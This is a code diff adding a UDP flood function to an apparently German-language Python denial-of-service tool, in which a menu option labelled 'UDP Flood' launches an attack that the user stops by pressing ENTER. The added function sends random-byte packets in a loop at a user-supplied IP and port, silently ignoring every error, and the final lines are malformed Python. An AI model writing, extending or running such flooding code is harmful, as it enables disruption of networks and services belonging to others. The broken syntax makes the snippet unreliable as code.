@@ -99,3 +99,36 @@ if choice == "1":  # UDP Flood
 
     input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
     stop_event.set()
+
+
+
+
+
+
+
+
+
+
+
+def udp_flood(ip, port, packet_size, packet_rate):
+    global packet_counter
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)  # Empfangsbuffer minimieren
+    udp_bytes = random._urandom(packet_size)
+    start_time = time.time()
+
+    while not stop_event.is_set():
+        try:
+            sock.sendto(udp_bytes, (ip, port))
+            packet_counter += 1
+
+            # Paketrate begrenzen
+            if packet_counter / (time.time() - start_time) > packet_rate:
+                time.sleep(0.001)  # Kurz pausieren, um die Rate einzuhalten
+        except:
+            pass
+
+(
+packet_size = max(1, min(65507, int(input("Paketgröße (Bytes, 1-65507): "))))
+packet_rate = max(1, int(input("Maximale Pakete pro Sekunde (min. 1): ")))
+)
